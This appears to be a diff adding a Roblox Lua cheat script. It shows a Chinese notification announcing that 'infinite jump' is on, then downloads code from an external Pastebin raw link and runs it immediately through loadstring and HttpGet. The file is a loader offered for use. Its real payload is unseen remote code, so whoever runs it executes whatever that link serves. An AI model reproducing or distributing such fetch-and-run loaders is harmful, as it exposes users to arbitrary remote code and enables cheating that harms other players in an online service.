@@ -1,0 +1,9 @@
+wait(1)
+local CoreGui = game:GetService("StarterGui")
+CoreGui:SetCore("SendNotification", {
+    Title = "🇨🇳空脚本提示🇨🇳",
+    Text = "空脚本无限跳跃已开启",
+    Duration = 1, 
+})
+
+loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()
